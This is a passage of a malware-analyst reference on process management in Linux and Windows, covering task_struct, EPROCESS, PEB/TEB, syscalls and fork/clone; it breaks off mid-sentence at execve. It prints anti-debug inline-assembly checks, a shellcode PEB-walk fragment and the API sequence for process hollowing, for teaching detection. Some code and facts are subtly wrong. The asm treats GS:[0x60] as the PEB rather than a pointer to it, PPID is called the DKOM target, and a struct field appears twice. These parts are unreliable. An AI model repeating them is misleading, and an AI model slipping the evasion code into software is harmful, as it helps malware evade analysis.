# Process Management in Rust, Go, and C
## Complete Elite Technical Reference — Malware Analyst & Reverse Engineer Edition

> *"Understanding process management at this depth separates the analyst who merely observes
> malware from the one who anticipates it, recognizes it, and writes the rule before it runs."*

---

## Table of Contents

1. [The Expert Mental Model](#1-the-expert-mental-model)
2. [Process Anatomy: OS Foundations](#2-process-anatomy-os-foundations)
3. [Virtual Memory Architecture](#3-virtual-memory-architecture)
4. [Process State Machine](#4-process-state-machine)
5. [Linux Internals: task_struct Deep Dive](#5-linux-internals-task_struct-deep-dive)
6. [Windows Internals: EPROCESS, PEB, TEB](#6-windows-internals-eprocess-peb-teb)
7. [System Call Interface](#7-system-call-interface)
8. [Process Lifecycle: Creation, Execution, Termination](#8-process-lifecycle)
   - 8.1 fork() — Unix Process Cloning
   - 8.2 vfork() — Deferred Copy
   - 8.3 clone() — Surgical Sharing
   - 8.4 execve() — Image Replacement
   - 8.5 The exec() Family
   - 8.6 waitpid() and Child Reaping
   - 8.7 exit() and _exit()
   - 8.8 Zombie and Orphan Processes
   - 8.9 Windows: CreateProcess()
9. [C Implementation: Complete POSIX API](#9-c-implementation-complete-posix-api)
10. [Rust Implementation](#10-rust-implementation)
11. [Go Implementation](#11-go-implementation)
12. [Inter-Process Communication (IPC)](#12-inter-process-communication-ipc)
13. [Signal Mechanics: Deep Signal Architecture](#13-signal-mechanics)
14. [Process Namespaces and Isolation](#14-process-namespaces-and-isolation)
15. [File Descriptor Inheritance](#15-file-descriptor-inheritance)
16. [Environment Variables: Mechanics and Abuse](#16-environment-variables)
17. [Process Scheduling and Priority](#17-process-scheduling-and-priority)
18. [Daemon Process Architecture](#18-daemon-process-architecture)
19. [The /proc Filesystem as Intelligence Source](#19-the-proc-filesystem-as-intelligence-source)
20. [Security and Malware Relevance](#20-security-and-malware-relevance)
21. [Cross-Language Binary Signatures](#21-cross-language-binary-signatures)
22. [Expert Mental Model: Synthesis](#22-expert-mental-model-synthesis)

---

## 1. The Expert Mental Model

A process is **not** a running program. That definition will fail you the moment you encounter
process hollowing, injection, or credential theft.

**Correct mental model:**

> A process is an OS **kernel abstraction** — a collection of virtualized resources (address
> space, file descriptors, security context, CPU scheduling entity) owned by the kernel and
> represented through an internal data structure (PCB/task_struct/EPROCESS). The ELF or PE
> binary is just code and static data on disk. The process is what the kernel constructs
> **around** that binary when execution begins.

This distinction is operationally critical:
- **Process hollowing** works because you can replace the image inside the process container
  while keeping the PID, handles, and security token intact.
- **PPID spoofing** works because the parent-child relationship is just a field in a kernel
  structure that can be manipulated at creation time.
- **Fork bombs** work because the kernel data structure (PCB) consumes memory and CPU,
  not just the binary.
- **DKOM rootkits** work because hiding a process means unlinking its PCB from kernel lists.

Every "process management" API call (`fork`, `CreateProcess`, `exec`, `kill`) is ultimately
a system call that asks the kernel to mutate its internal process tables.

---

## 2. Process Anatomy: OS Foundations

### 2.1 The Process Control Block (PCB)

The PCB is the kernel's complete record of a process. Linux calls it `task_struct`,
Windows calls it `EPROCESS`. Every process attribute you will ever read, modify, or
abuse in malware analysis flows through this structure.

```
+========================================================+
|               PROCESS CONTROL BLOCK (PCB)              |
+========================================================+
|  IDENTITY        | PID, PPID, PGID, SID               |
|                  | UID, EUID, GID, EGID                |
|                  | Capabilities bitmask                |
+------------------+-------------------------------------+
|  MEMORY MAP      | Pointer to page directory (cr3)    |
|                  | mm_struct / EPROCESS.VadRoot         |
|                  | Heap start/end, stack start/end     |
|                  | List of VMAs (Virtual Memory Areas)  |
+------------------+-------------------------------------+
|  FILE SYSTEM     | File descriptor table               |
|                  | Pointer to root inode / CWD         |
|                  | Open file count                     |
+------------------+-------------------------------------+
|  SIGNALS         | Pending signal bitmap (64-bit mask) |
|                  | Blocked signal mask                  |
|                  | Signal handler function table        |
|                  | Alternate signal stack               |
+------------------+-------------------------------------+
|  SCHEDULING      | State (RUNNING, SLEEPING, ZOMBIE)   |
|                  | Priority / nice value               |
|                  | CPU affinity mask                   |
|                  | Time slice remaining                 |
|                  | Total CPU time consumed             |
+------------------+-------------------------------------+
|  IPC             | Namespace pointers (net, pid, mnt)  |
|                  | Shared memory segment list          |
|                  | Message queue descriptors           |
+------------------+-------------------------------------+
|  SECURITY        | SELinux / AppArmor context          |
|                  | seccomp BPF filter pointer          |
|                  | Credentials struct                  |
+------------------+-------------------------------------+
|  SAVED REGISTERS | EIP/RIP (instruction pointer)      |
|  (when preempted)| ESP/RSP (stack pointer)             |
|                  | General-purpose registers           |
+========================================================+
```

### 2.2 Process Identity Fields

| Field | Type   | Description                                              |
|-------|--------|----------------------------------------------------------|
| PID   | pid_t  | Process ID — kernel-assigned unique identifier           |
| PPID  | pid_t  | Parent PID — who created this process                    |
| PGID  | pid_t  | Process Group ID — for job control and signal delivery   |
| SID   | pid_t  | Session ID — terminal session grouping                   |
| UID   | uid_t  | Real User ID — who actually owns the process             |
| EUID  | uid_t  | Effective User ID — what privileges it currently has     |
| GID   | gid_t  | Real Group ID                                            |
| EGID  | gid_t  | Effective Group ID                                       |

**PPID is the DKOM target**: rootkits unlink the `task_struct` from
`init_task.tasks` (the doubly-linked list of all processes) so `ps`, `top`, and
`/proc` iterators skip it. But memory forensics tools like Volatility scan physical
memory for `task_struct` signatures regardless of list linkage — this is the
`linux.pslist` vs `linux.psscan` distinction.

---

## 3. Virtual Memory Architecture

### 3.1 Linux x86-64 Process Address Space

```
   Virtual Address (64-bit canonical)
   +---+
   |   |
   | F |  0xFFFFFFFFFFFFFFFF
   | F |  +-------------------------------------------+
   | F |  |                                           |
   | F |  |         K E R N E L   S P A C E          |
   | 8 |  |                                           |
   |   |  |   Kernel code, data, vmalloc, physmap,    |
   |   |  |   loaded modules, per-CPU areas            |
   |   |  |   (mapped in ALL processes, hidden by      |
   |   |  |    SMEP/SMAP/KPTI from userland access)   |
   |   |  |                                           |
   |   |  +-------------------------------------------+
   | 8 |  0xFFFF800000000000
   |   |
   |   |   [[ NON-CANONICAL ADDRESS HOLE             ]]
   |   |   [[ Accessing here raises #GP fault        ]]
   |   |   [[ Used as a null-pointer guard in some   ]]
   |   |   [[ 64-bit ABI implementations             ]]
   |   |
   | 7 |  0x00007FFFFFFFFFFF
   | F |  +-------------------------------------------+
   | F |  |   STACK (grows downward)                  |
   | F |  |   argv[], envp[], ELF aux vectors         |
   | F |  |   Local variables, saved return addrs     |
   | F |  |   Stack grows from high to low address    |
   | F |  |   [Guard page below — triggers SIGSEGV]   |
   |   |  +- - - - - - - - - - - - - - - - - - - - - +
   |   |  |   (ASLR-randomized gap, ~128TB)           |
   |   |  +- - - - - - - - - - - - - - - - - - - - - +
   |   |  |   Thread stacks (each thread's mmap'd    |
   |   |  |   stack: default 8MB, guard page below)  |
   |   |  +- - - - - - - - - - - - - - - - - - - - - +
   |   |  |   mmap() region: shared libraries,       |
   |   |  |   anonymous maps, file-backed mappings   |
   |   |  |   libpthread.so, libc.so, ld.so, etc.    |
   |   |  |   (base randomized by ASLR each exec)    |
   |   |  +- - - - - - - - - - - - - - - - - - - - - +
   |   |  |   HEAP (grows upward)                    |
   |   |  |   malloc/new/sbrk managed by allocator   |
   |   |  |   glibc uses mmap for > MMAP_THRESHOLD   |
   |   |  +-------------------------------------------+
   |   |  |   BSS   (uninitialized globals, zeroed)   |
   |   |  +-------------------------------------------+
   |   |  |   DATA  (initialized globals + statics)   |
   |   |  +-------------------------------------------+
   |   |  |   RODATA (const data, vtables, literals)  |
   |   |  +-------------------------------------------+
   |   |  |   TEXT  (executable code, read-only)      |
   |   |  |   (shared via COW between parent/child    |
   |   |  |    after fork before exec)                |
   | 4 |  +-------------------------------------------+
   | 0 |  0x0000000000400000  <-- no-PIE default base
   |   |  +-------------------------------------------+
   |   |  |   NULL guard page (PROT_NONE)             |
   |   |  |   Accessing NULL dereferences -> SIGSEGV  |
   | 0 |  +-------------------------------------------+
   |   |  0x0000000000000000
   +---+

NOTE: With PIE (Position Independent Executable), the TEXT/DATA/BSS
      base is also randomized by ASLR (typically in 0x555555554000 range).
      /proc/PID/maps reveals the actual layout at runtime.
```

### 3.2 Segment Permissions Table

| Segment  | Typical Permissions | Contents                              | ELF Source          |
|----------|---------------------|---------------------------------------|---------------------|
| .text    | r-x                 | Machine code, string literals         | PT_LOAD (PF_X)      |
| .rodata  | r--                 | const arrays, switch tables, vtables  | PT_LOAD             |
| .data    | rw-                 | Initialized globals, static vars      | PT_LOAD (PF_W)      |
| .bss     | rw-                 | Uninitialized globals (zeroed)        | PT_LOAD filesz=0    |
| heap     | rw-                 | Dynamic allocations (malloc)          | Anonymous mmap      |
| [stack]  | rw-                 | Call frames, local vars, ret addrs    | Kernel-provisioned  |
| [vdso]   | r-x                 | Virtual DSO (gettimeofday fast path)  | Kernel-injected     |
| [vvar]   | r--                 | Read-only kernel data (clock vars)    | Kernel-injected     |
| .so maps | r-x / r-- / rw-     | Shared library code + data            | File-backed mmap    |

**Malware indicator — rwx regions**: Legitimate code segments are `r-x`. When you see
`rwx` in `/proc/PID/maps` or in Volatility's `linux.proc.maps` plugin output, you are
almost certainly looking at:
- Shellcode staging area
- JIT-compiled code (benign in JVM/V8 but worth noting)
- Custom packer stub that decrypted itself
- Process injection target after `mprotect(PROT_READ|PROT_WRITE|PROT_EXEC)`

### 3.3 Windows Virtual Address Space (x64)

```
   0xFFFFFFFFFFFFFFFF  +-------------------------------+
                       |   Kernel Space (128TB)        |
                       |   HAL, ntoskrnl, drivers      |
                       |   System PTEs, PFN database   |
                       |   Kernel stacks               |
   0xFFFF080000000000  +-------------------------------+
                       |   (Canonical hole)            |
   0x00007FFFFFFFFFFF  +-------------------------------+
                       |   User Mode Stack             |
                       |   (default 1MB, reserve 1MB) |
                       +- - - - - - - - - - - - - - - +
                       |   PEB  (Process Env Block)    |  <- 0x7FFDE000 (approx)
                       |   TEB  (Thread Env Block)     |  <- GS:[0] points here
                       +- - - - - - - - - - - - - - - +
                       |   Loaded DLLs (MEM_IMAGE)     |
                       |   ntdll.dll, kernel32.dll etc |
                       |   (base randomized by ASLR)   |
                       +- - - - - - - - - - - - - - - +
                       |   Heap allocations            |
                       |   (HeapCreate/HeapAlloc)      |
                       +- - - - - - - - - - - - - - - +
                       |   PE image (MEM_IMAGE)        |
                       |   .text / .data / .rsrc       |
                       |   (base 0x140000000 for x64)  |
   0x0000000000000000  +-------------------------------+
                       |   NULL guard page             |
                       +-------------------------------+
```

---

## 4. Process State Machine

```
                  fork() / CreateProcess()
                            |
                            v
                      +----------+
                      |  CREATED  |
                      |  (NEW)    |
                      +----------+
                            |
               kernel initializes PCB, allocs mm
                            |
                            v
          time expired  +----------+    I/O done /
          SIGSTOP +---> |  READY   | <--+ signal woke it
          SIGCONT |     | (RUNNABLE)|   |
                  |     +----------+   |
                  |           |        |
                  |  scheduler selects |
                  |           v        |
          +-------+--+   +----------+  |
          |  prev    |   | RUNNING  |--+ syscall yields
          | context  |   | (ON CPU) |    (voluntary)
          | restored +<--+----------+
                               |
                    +----------+----------+----------+
                    |          |          |          |
                I/O request  wait()    SIGSTOP    exit()
                mutex wait   sleep()   debugger
                    |          |       attach        |
                    v          v          |          v
             +----------+ +----------+ +------+ +--------+
             | BLOCKED  | | SLEEPING | |STOPPED| | ZOMBIE |
             | (I/O     | | (nanosec,| |(TSTP/ | |(EXIT_  |
             |  WAIT)   | |  futex,  | | STOP) | |ZOMBIE) |
             +----------+ |  select) | +------+ +--------+
                    |     +----------+    |          |
                    |           |         |  parent calls
                    |           |  SIGCONT|  waitpid()
                    +-----------+---------+          |
                                |                    v
                    (woken, moved to READY)     +--------+
                                                |  DEAD  |
                                                |(PCB    |
                                                | freed) |
                                                +--------+
```

**Linux `task_struct->__state` Constants**:

| Constant              | Value | Description                                         |
|-----------------------|-------|-----------------------------------------------------|
| TASK_RUNNING          | 0x00  | On CPU or runqueue (not necessarily using CPU)      |
| TASK_INTERRUPTIBLE    | 0x01  | Sleeping; can wake on signal                        |
| TASK_UNINTERRUPTIBLE  | 0x02  | Sleeping; SIGKILL cannot wake it (D state in ps)   |
| __TASK_STOPPED        | 0x04  | Stopped by SIGSTOP/SIGTSTP                         |
| __TASK_TRACED         | 0x08  | **Debugger attached via ptrace()** — anti-debug key |
| EXIT_DEAD             | 0x10  | Being removed from task list                        |
| EXIT_ZOMBIE           | 0x20  | Exited, not yet waited on                           |
| TASK_PARKED           | 0x40  | Used by kthread parking mechanism                   |

**Critical RE note**: `__TASK_TRACED` being set is what you see in `/proc/PID/status` as
`TracerPid: <non-zero>`. Anti-debug routines in malware check this field. If the TracerPid
is non-zero, a debugger (or sandbox ptrace monitor) is attached. Malware samples like
**njRAT** and **AsyncRAT** variants check this.

---

## 5. Linux Internals: task_struct Deep Dive

The `task_struct` is defined in `include/linux/sched.h`. It is ~800+ fields. The key
fields from a malware analyst and kernel exploitation perspective:

```
struct task_struct {
    /*
     * === SCHEDULING ===
     */
    unsigned int            __state;        /* TASK_RUNNING, TASK_INTERRUPTIBLE ... */
    unsigned int            flags;          /* PF_FORKNOEXEC, PF_SUPERPRIV, etc.  */
    int                     prio;           /* dynamic priority                    */
    int                     static_prio;    /* nice value translated to prio       */
    int                     normal_prio;    /* base priority                       */
    unsigned int            rt_priority;    /* real-time priority (0 = non-RT)     */

    /*
     * === IDENTITY ===
     */
    pid_t                   pid;            /* process ID                          */
    pid_t                   tgid;           /* thread group ID (= PID of group)    */
    struct task_struct     *real_parent;    /* who fork()'d us                     */
    struct task_struct     *parent;         /* current parent (may differ if reparented) */
    struct list_head        children;       /* list of our children                */
    struct list_head        sibling;        /* links in parent->children           */
    struct task_struct     *group_leader;   /* thread group leader                 */

    /*
     * === LINKED LIST (DKOM target) ===
     * Unlinking from this list hides process from ps/top//proc iterator
     * BUT: physical memory scanners (Volatility psscan) find task_struct
     *      by scanning for the magic value 0x8 slab allocator patterns
     */
    struct list_head        tasks;          /* entry in global task list           */

    /*
     * === MEMORY ===
     */
    struct mm_struct       *mm;             /* user-space memory descriptor (NULL for kernel threads) */
    struct mm_struct       *active_mm;      /* active mm (== mm for normal processes)  */

    /*
     * === FILES ===
     */
    struct fs_struct       *fs;             /* filesystem info (root, cwd, umask) */
    struct files_struct    *files;          /* open file descriptor table         */

    /*
     * === SIGNALS ===
     */
    struct signal_struct   *signal;         /* shared between threads in group    */
    struct sighand_struct  *sighand;        /* signal handlers (shared if CLONE_SIGHAND) */
    sigset_t                blocked;        /* blocked signals bitmask            */
    sigset_t                real_blocked;   /* saved blocked mask                 */
    struct sigpending       pending;        /* private pending signals            */

    /*
     * === SECURITY ===
     */
    const struct cred      *cred;           /* effective credentials (uid, gid, caps) */
    const struct cred      *real_cred;      /* real credentials                   */

    /*
     * === NAMESPACES ===
     */
    struct nsproxy         *nsproxy;        /* pointer to namespace container:
                                              - uts_ns   (hostname)
                                              - ipc_ns   (SysV IPC)
                                              - mnt_ns   (mountpoints)
                                              - pid_ns_for_children
                                              - net_ns   (network stack)
                                              - cgroup_ns                        */

    /*
     * === PTRACE (anti-debug relevance) ===
     */
    unsigned long           ptrace;         /* PT_PTRACED flag                    */
    struct task_struct     *parent;         /* tracer process (debugger's task)   */
};
```

### 5.1 mm_struct — Memory Descriptor

```
struct mm_struct {
    struct maple_tree   mm_mt;       /* Virtual Memory Area tree (modern kernels use maple tree) */
    unsigned long       mmap_base;   /* base of mmap area                       */
    unsigned long       task_size;   /* size of task VM space                   */

    pgd_t              *pgd;         /* page global directory (loaded into CR3) */

    unsigned long       start_code;  /* .text start                             */
    unsigned long       end_code;    /* .text end                               */
    unsigned long       start_data;  /* .data start                             */
    unsigned long       end_data;    /* .data end                               */
    unsigned long       start_brk;   /* heap start                              */
    unsigned long       brk;         /* current top of heap (sbrk moves this)   */
    unsigned long       start_stack; /* initial stack pointer                   */
    unsigned long       arg_start;   /* argv start                              */
    unsigned long       arg_end;     /* argv end                                */
    unsigned long       env_start;   /* envp start                              */
    unsigned long       env_end;     /* envp end                                */
};
```

The `mm_struct` is **the key structure** when writing Volatility plugins or kernel
exploits. `start_brk/brk` tells you the heap boundaries; `start_stack` tells you where
the initial stack was placed. You can read these from `/proc/PID/maps` in userspace.

### 5.2 files_struct — File Descriptor Table

```
struct files_struct {
    int         count;              /* reference count                           */
    struct fdtable __rcu *fdt;      /* pointer to fdtable                        */
    struct fdtable fdtab;           /* embedded fdtable for small fd sets        */
    /* fdtable contains:
       - unsigned long   *close_on_exec; (FD_CLOEXEC bitmap)
       - struct file    **fd;           (array of file pointers)
       - unsigned int    max_fds;       (current table capacity)
    */
};
```

When a process calls `fork()`, the child inherits a **copy** of the fd table
(not the same object unless `CLONE_FILES` is used). File descriptors marked
`FD_CLOEXEC` are closed when `exec()` is called. This is the mechanism that
prevents fd leaks into child processes.

---

## 6. Windows Internals: EPROCESS, PEB, TEB

### 6.1 EPROCESS Structure (Windows 10/11 x64, key fields)

```
+EPROCESS (kernel object, ring-0 only unless read via NtQuerySystemInformation)
|
|  Offset  Size  Field
|  ------  ----  -----
|  0x000   0xB8  Pcb (KPROCESS) -- scheduling info, kernel stack
|  0x0B8   0x08  UniqueProcessId          <-- PID
|  0x0C0   0x10  ActiveProcessLinks       <-- DKOM target (Flink/Blink)
|  0x0D8   0x08  CreateTime (FILETIME)
|  0x2E0   0x08  ObjectTable (HANDLE_TABLE) -- process's handle table
|  0x318   0x08  Token (EX_FAST_REF)      <-- security token pointer
|  0x320   0x08  WorkingSetPage
|  0x380   0x08  Peb                      <-- pointer to PEB (user-mode visible!)
|  0x448   0x08  ImageFileName[15]        <-- truncated process name (15 chars)
|  0x488   0x08  VadRoot (RTL_AVL_TREE)   <-- Virtual Address Descriptor tree
|  0x7A8   0x04  ExitStatus               <-- STILL_ACTIVE = 0x103 if alive
|
+KPROCESS (embedded at start of EPROCESS)
   0x000   0x18  Header (DISPATCHER_HEADER)
   0x028   0x08  DirectoryTableBase       <-- PML4 physical address (CR3 value)
   0x030   0x08  UserDirectoryTableBase   <-- KPTI second page table (Win10 RS4+)
```

**ActiveProcessLinks DKOM**: Unlinking `EPROCESS.ActiveProcessLinks` from the global
doubly-linked list (headed at `PsActiveProcessHead`) hides the process from the Windows
kernel enumerator used by Task Manager, Process Explorer, and WMI. This is the technique
used by **TDL rootkits**, **Necurs**, and **Azazel**. Volatility's `windows.psscan` module
finds processes by scanning the kernel pool for the `Proc` pool tag `\x50\x72\x6f\x63`
rather than walking the linked list.

### 6.2 PEB Structure (Process Environment Block)

The PEB lives in user mode (`~0x7FFDE000` in 32-bit, randomized in 64-bit) and is readable
without privilege. This makes it a **primary anti-debug and loader intelligence source**.

```
+PEB (user-mode, 64-bit offsets)
|
|  Offset  Size  Field
|  ------  ----  -----
|  0x000   0x01  InheritedAddressSpace
|  0x001   0x01  ReadImageFileExecOptions
|  0x002   0x01  BeingDebugged            <-- IsDebuggerPresent() reads this!
|                                              0x00 = no debugger
|                                              0x01 = debugger attached
|  0x003   0x01  BitField                 <-- NtGlobalFlag indirectly
|  0x010   0x08  ImageBaseAddress         <-- loaded PE base address
|  0x018   0x08  Ldr (PEB_LDR_DATA *)     <-- module list (loaded DLLs)
|  0x020   0x08  ProcessParameters        <-- RTL_USER_PROCESS_PARAMETERS
|                                              (cmdline, image path, env block)
|  0x058   0x08  AnsiCodePageData
|  0x068   0x08  NlsAnsiCodePageData
|  0x0BC   0x04  NtGlobalFlag             <-- debug heap flags:
|                                              FLG_HEAP_ENABLE_TAIL_CHECK = 0x10
|                                              FLG_HEAP_ENABLE_FREE_CHECK = 0x20
|                                              FLG_HEAP_VALIDATE_PARAMETERS = 0x40
|                                              (NtGlobalFlag != 0 = debugger!)
|  0x0C0   0x08  CriticalSectionTimeout
|  0x0D8   0x08  NumberOfProcessors
|  0x100   0x08  NtSystemRoot
|  0x2E8   0x04  OSMajorVersion
|
+PEB_LDR_DATA (pointed to by PEB.Ldr)
|  InLoadOrderModuleList   -- DLL list in load order
|  InMemoryOrderModuleList -- DLL list in memory order (start of LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks)
|  InInitializationOrderModuleList

+LDR_DATA_TABLE_ENTRY (one per loaded DLL)
   DllBase           -- base address of loaded DLL
   EntryPoint        -- DllMain address
   SizeOfImage       -- size in bytes
   FullDllName       -- full path (UNICODE_STRING)
   BaseDllName       -- filename only (UNICODE_STRING)
```

**Anti-debug techniques that target PEB**:

```c
// Technique 1: BeingDebugged check (IsDebuggerPresent() is just a wrapper for this)
// Direct PEB read via GS segment register (Windows x64: GS:[0x60] = PEB)
// Reads PEB.BeingDebugged at offset 0x02
bool being_debugged;
__asm__ volatile (
    "movb %%gs:0x62, %0"   // GS:[0x60] = PEB, +0x02 = BeingDebugged
    : "=r"(being_debugged)
);

// Technique 2: NtGlobalFlag check
// If a debugger is present: NtGlobalFlag = 0x70 (heap debug flags set)
DWORD ntglobal_flag;
__asm__ volatile (
    "movl %%gs:0x11C, %0"  // GS:[0x60] + 0xBC = NtGlobalFlag
    : "=r"(ntglobal_flag)
);
if (ntglobal_flag & 0x70) { /* debugger detected */ }

// Technique 3: Heap flags via PEB
// PEB.ProcessHeap at offset 0x30, then Heap.Flags at +0x40 (x64)
// Normal: Flags=0x2, ForceFlags=0x0
// Debug:  Flags=0x50000062, ForceFlags=0x40000060
```

### 6.3 TEB Structure (Thread Environment Block)

Each thread has its own TEB. Accessed via `GS` (x64) or `FS` (x86) segment register.
`GS:[0x00]` is a self-referential pointer to the TEB itself.

```
+TEB (Thread Environment Block, 64-bit offsets)
|
|  0x000   NtTib.ExceptionList    -- SEH chain head (x86 only, x64 uses table)
|  0x008   NtTib.StackBase        -- top of stack (high address)
|  0x010   NtTib.StackLimit       -- bottom of stack (low address)
|  0x018   NtTib.Self             -- self-pointer to TEB (GS:[0x18] = TEB address)
|  0x030   NtTib.Self (32b compat)
|  0x060   ProcessEnvironmentBlock  <-- pointer to PEB!
|  0x068   LastErrorValue           <-- GetLastError() reads here
|  0x070   CountOfOwnedCriticalSections
|  0x100   TlsSlots[64]             <-- Thread Local Storage array
|  0x1480  TlsExpansionSlots        <-- extended TLS
|  0x1748  LastStatusValue          <-- NTSTATUS from last syscall (RtlGetLastNtStatus)
|  0x2C68  Instrumentation[16]      <-- ETW thread activity GUID
```

**Why TEB matters for RE**: Any shellcode or position-independent payload that needs
to find the base of `ntdll.dll` or `kernel32.dll` does so by:
1. Read `GS:[0x60]` → PEB
2. Read `PEB.Ldr` → PEB_LDR_DATA
3. Walk `InLoadOrderModuleList` → find kernel32 LDR_DATA_TABLE_ENTRY
4. Read `DllBase` → kernel32 base address

This "PEB walk" pattern is the **canonical shellcode technique** seen in virtually every
Windows shellcode sample. When you see assembly like:

```nasm
mov rax, gs:[60h]      ; PEB
mov rax, [rax + 18h]   ; PEB.Ldr
mov rax, [rax + 20h]   ; Ldr.InMemoryOrderModuleList.Flink (ntdll entry)
mov rax, [rax + 20h]   ; .Flink again (kernel32 entry)
mov rax, [rax + 20h]   ; .Flink again (kernelbase entry, order varies)
mov rbx, [rax - 08h]   ; DllBase (InMemoryOrderLinks at +0x10 of entry, DllBase at +0x30, so adjust)
```

You are watching the PEB walk. This is **T1055** (Process Injection) precursor and
**T1027** (Obfuscated Files or Information) bypass.

---

## 7. System Call Interface

### 7.1 Linux Process-Related Syscalls

| Syscall       | Number (x64) | Description                                          |
|---------------|--------------|------------------------------------------------------|
| fork          | 57           | Clone process (full copy-on-write)                   |
| vfork         | 58           | Clone, share parent's mm until exec                  |
| clone         | 56           | Clone with fine-grained sharing flags                |
| clone3        | 435          | Extended clone with struct argument                  |
| execve        | 59           | Replace process image with new binary                |
| execveat      | 322          | execve relative to directory fd                      |
| exit          | 60           | Terminate current thread                             |
| exit_group    | 231          | Terminate all threads in group                       |
| wait4         | 61           | Wait for child state change                          |
| waitid        | 247          | Wait with more options                               |
| getpid        | 39           | Get current PID                                      |
| getppid       | 110          | Get parent PID                                       |
| getpgid       | 121          | Get process group ID                                 |
| setpgid       | 109          | Set process group ID                                 |
| getsid        | 124          | Get session ID                                       |
| setsid        | 112          | Create new session                                   |
| kill          | 62           | Send signal to process/group                         |
| tkill         | 200          | Send signal to specific thread                       |
| tgkill        | 234          | Send signal to specific thread in group              |
| prctl         | 157          | Process control operations                           |
| ptrace        | 101          | Process trace (debugger interface)                   |
| nanosleep     | 35           | Sleep (used by sandbox evasion)                      |
| pipe          | 22           | Create anonymous pipe                                |
| pipe2         | 293          | Create pipe with flags (O_CLOEXEC, O_NONBLOCK)       |
| dup/dup2/dup3 | 32/33/292    | Duplicate file descriptor                            |
| chroot        | 161          | Change root directory                                |
| unshare       | 272          | Create new namespaces without forking                |

### 7.2 Windows Process API

| WinAPI Function          | Syscall (Nt*)                | Description                               |
|--------------------------|------------------------------|-------------------------------------------|
| CreateProcessA/W         | NtCreateUserProcess          | Create new process                        |
| OpenProcess              | NtOpenProcess                | Get handle to existing process            |
| TerminateProcess         | NtTerminateProcess           | Force-terminate process                   |
| VirtualAllocEx           | NtAllocateVirtualMemory      | Allocate memory in target process         |
| WriteProcessMemory       | NtWriteVirtualMemory         | Write to target process memory            |
| ReadProcessMemory        | NtReadVirtualMemory          | Read from target process memory           |
| CreateRemoteThread       | NtCreateThreadEx             | Create thread in remote process           |
| NtUnmapViewOfSection     | (direct Nt call)             | Unmap image section (hollowing step 2)    |
| SetThreadContext         | NtSetContextThread           | Modify thread registers (hollowing step 4)|
| ResumeThread             | NtResumeThread                | Start suspended thread (hollowing step 5) |
| QueryFullProcessImageName| NtQueryInformationProcess    | Get process image path                    |
| IsDebuggerPresent        | (reads PEB.BeingDebugged)    | Anti-debug check                          |
| CheckRemoteDebuggerPresent| NtQueryInformationProcess   | Remote anti-debug check                   |

---

## 8. Process Lifecycle

### 8.1 fork() — Unix Process Cloning

`fork()` creates an exact copy of the calling process. The child is a near-perfect clone
with a new PID and PPID set to parent's PID.

```
BEFORE fork():
+-------------------+        Physical Memory
| Parent Process    |       +------------------+
| PID: 1234         |       | Frame A: .text   |
| Page Table:       |       | Frame B: heap    |
|   VA_text  -> A   |-----> | Frame C: stack   |
|   VA_heap  -> B   |       | Frame D: data    |
|   VA_stack -> C   |       +------------------+
|   VA_data  -> D   |
+-------------------+

fork() is called:

AFTER fork() — Copy-on-Write:
+-------------------+        Physical Memory        +-------------------+
| Parent Process    |       +------------------+    | Child Process     |
| PID: 1234         |       | Frame A: .text   |    | PID: 1235         |
| Page Table:       |       | Frame B: heap    |    | Page Table:       |
|   VA_text  -> A   |-----> | (marked read-only|<---|   VA_text  -> A   |
|   VA_heap  -> B   |-----> |  for both!)      |<---|   VA_heap  -> B   |
|   VA_stack -> C   |-----> | Frame C: stack   |<---|   VA_stack -> C   |
|   VA_data  -> D   |-----> | Frame D: data    |<---|   VA_data  -> D   |
+-------------------+       +------------------+    +-------------------+

Parent writes to heap (VA_heap):
Page fault triggered -> kernel allocates Frame E
Parent's VA_heap now points to Frame E (copy of B)
Child's VA_heap still points to Frame B

+-------------------+                               +-------------------+
| Parent Process    |       Physical Memory         | Child Process     |
| PID: 1234         |  Frame A: .text (shared RO)   | PID: 1235         |
| VA_heap  -> E  ---|-> Frame E: heap (parent's copy)|   VA_heap  -> B  |
+-------------------+  Frame B: heap (child's copy) +-------------------+
```

**fork() return value semantics**:
```c
pid_t pid = fork();
if (pid < 0)  { /* error */ }
if (pid == 0) { /* we are the child  (fork returns 0 to child)  */ }
if (pid > 0)  { /* we are the parent (fork returns child PID)   */ }
```

**What fork() preserves in the child**:
- All open file descriptors (shared underlying file descriptions)
- Current working directory
- Root directory
- Signal dispositions (but pending signals are NOT inherited)
- Environment variables
- Memory contents (COW)
- Process group ID
- Session ID
- User/group IDs
- Resource limits (rlimits)
- Memory locks (mlock)
- CPU affinity

**What fork() does NOT preserve**:
- Child gets new PID, PPID = parent's PID
- Pending signals are cleared in child
- Memory locks created by other threads (not inherited)
- Thread list (only the calling thread is duplicated)
- Timers (interval timers are not inherited)
- Mutexes held by other threads in parent (fork-safety issue)

### 8.2 vfork() — Deferred Copy

`vfork()` creates a child that **shares the parent's address space directly**. No
copy-on-write — it's the same pages. The parent is suspended until the child calls
`exec()` or `_exit()`. Modern Linux implements this with `CLONE_VM | CLONE_VFORK`.

```
vfork() use case:
Parent: vfork() -> SUSPENDED
Child:  shares parent mm -> calls execve("/bin/sh", ...) -> new image loaded
        exec replaces address space -> CLONE_VM link broken
Parent: resumes execution

Security implication: child MUST NOT return from the function that called vfork().
If child modifies any stack variable, it corrupts the parent's stack too.
This is why vfork() is almost never used directly — use posix_spawn() instead.
```

### 8.3 clone() — Surgical Sharing

`clone()` is the underlying syscall that both `fork()` and `pthread_create()` use.
The key difference is the `flags` parameter that controls **what is shared**.

```
clone(fn, child_stack, flags, arg, ...);

CLONE_VM        = 0x00000100  // share address space (thread-like)
CLONE_FS        = 0x00000200  // share filesystem info (cwd, root, umask)
CLONE_FILES     = 0x00000400  // share file descriptor table
CLONE_SIGHAND   = 0x00000800  // share signal handlers
CLONE_THREAD    = 0x00010000  // same thread group (pthread uses this)
CLONE_NEWNS     = 0x00020000  // new mount namespace
CLONE_NEWPID    = 0x20000000  // new PID namespace (container PID isolation)
CLONE_NEWNET    = 0x40000000  // new network namespace
CLONE_NEWUSER   = 0x10000000  // new user namespace
CLONE_NEWUTS    = 0x04000000  // new UTS namespace (hostname)
CLONE_NEWIPC    = 0x08000000  // new IPC namespace

fork()  = clone(CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
thread  = clone(CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND |
                CLONE_THREAD | CLONE_SIGHAND | CLONE_SETTLS | ...)
```

### 8.4 execve() — Image Replacement

`execve()` is the most important process-related syscall. It **replaces the current
